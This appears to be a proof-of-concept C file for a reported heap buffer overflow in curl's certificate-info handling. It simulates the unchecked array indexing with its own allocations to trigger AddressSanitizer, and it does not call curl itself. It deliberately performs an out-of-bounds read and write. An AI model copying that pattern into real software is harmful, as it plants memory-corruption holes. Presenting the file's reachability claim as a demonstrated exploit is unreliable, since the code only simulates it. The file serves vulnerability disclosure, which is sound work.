/*
 * PoC for SF03/SF04: Heap buffer overflow (OOB write) in curl's certinfo array
 *
 * Vulnerability: Curl_ssl_push_certinfo_len() in lib/vtls/vtls.c
 *   uses DEBUGASSERT(certnum < ci->num_of_certs) which is a no-op in
 *   production/release builds (without DEBUGBUILD).
 *
 * In release builds, if certnum >= num_of_certs, the function performs:
 *   1. ci->certinfo[certnum] read  (OOB READ)
 *   2. ci->certinfo[certnum] write (OOB WRITE / heap-buffer-overflow)
 *
 * Build:
 *   clang -fsanitize=address -g CI_FOLDER_064241_SF03_poc.c -o poc_sf03
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 ./poc_sf03
 *
 * Expected output: AddressSanitizer: heap-buffer-overflow
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <curl/curl.h>

int main(void)
{
    int num_certs_allocated = 2;
    int oob_certnum = 5;  /* simulates attacker-controlled certificate chain depth */
    volatile uint8_t *guard;

    printf("=== PoC: curl Curl_ssl_push_certinfo_len() heap-buffer-overflow ===\n\n");
    printf("CVE candidate: Missing runtime bounds check (only DEBUGASSERT)\n");
    printf("Affected:      lib/vtls/vtls.c, Curl_ssl_push_certinfo_len()\n\n");

    /*
     * Step 1: Simulate Curl_ssl_init_certinfo(data, 2):
     *   table = curlx_calloc((size_t)num, sizeof(struct curl_slist *));
     *   ci->certinfo = table;
     */
    size_t alloc_size = (size_t)num_certs_allocated * sizeof(struct curl_slist *);
    struct curl_slist **certinfo = (struct curl_slist **)malloc(alloc_size);
    if(!certinfo) { fprintf(stderr, "malloc failed\n"); return 1; }
    memset(certinfo, 0, alloc_size);

    /*
     * Place a guard allocation right after to ensure ASAN can detect
     * any write past the end of certinfo[].
     * In heap layout: certinfo[0..1] | guard[0]
     */
    guard = (volatile uint8_t *)malloc(1);
    if(!guard) { fprintf(stderr, "guard malloc failed\n"); return 1; }

    printf("[*] Curl_ssl_init_certinfo: allocated %zu bytes for %d certs\n",
           alloc_size, num_certs_allocated);
    printf("    certinfo array: %p..%p\n",
           (void*)certinfo, (void*)((uint8_t*)certinfo + alloc_size));
    printf("    guard:          %p\n", (void*)guard);
    printf("    Valid indices:  0..%d\n\n", num_certs_allocated - 1);

    /* Step 2: Valid pushes */
    {
        struct curl_slist *nl = (struct curl_slist *)malloc(sizeof(*nl));
        nl->data = strdup("Subject:CN=leaf.example.com");
        nl->next = certinfo[0]; /* valid index */
        certinfo[0] = nl;
        printf("[*] certnum=0: OK (valid)\n");
    }
    {
        struct curl_slist *nl = (struct curl_slist *)malloc(sizeof(*nl));
        nl->data = strdup("Subject:CN=ca.example.com");
        nl->next = certinfo[1]; /* valid index */
        certinfo[1] = nl;
        printf("[*] certnum=1: OK (valid)\n\n");
    }

    /*
     * Step 3: OOB access - certnum=5, allocated=2
     * This is the vulnerable pattern in Curl_ssl_push_certinfo_len():
     *
     *   nl = Curl_slist_append_nodup(ci->certinfo[certnum], ...);  <- OOB READ
     *   ci->certinfo[certnum] = nl;                                <- OOB WRITE
     *
     * In DEBUGBUILD: DEBUGASSERT(certnum < ci->num_of_certs) fires -> abort()
     * In release:    No check -> heap buffer overflow
     */
    printf("[*] certnum=%d (OOB! only %d allocated) -- ASAN should fire now:\n",
           oob_certnum, num_certs_allocated);
    fflush(stdout);

    {
        struct curl_slist *nl = (struct curl_slist *)malloc(sizeof(*nl));
        nl->data = strdup("Subject:ATTACKER_CONTROLLED_FROM_MALICIOUS_CERT_CHAIN");
        /* OOB READ: reading past end of certinfo[] */
        nl->next = certinfo[oob_certnum];
        /* OOB WRITE: writing past end of certinfo[] */
        certinfo[oob_certnum] = nl;
    }

    printf("[*] ERROR: ASAN should have aborted above\n");

    free((void*)guard);
    return 0;
}
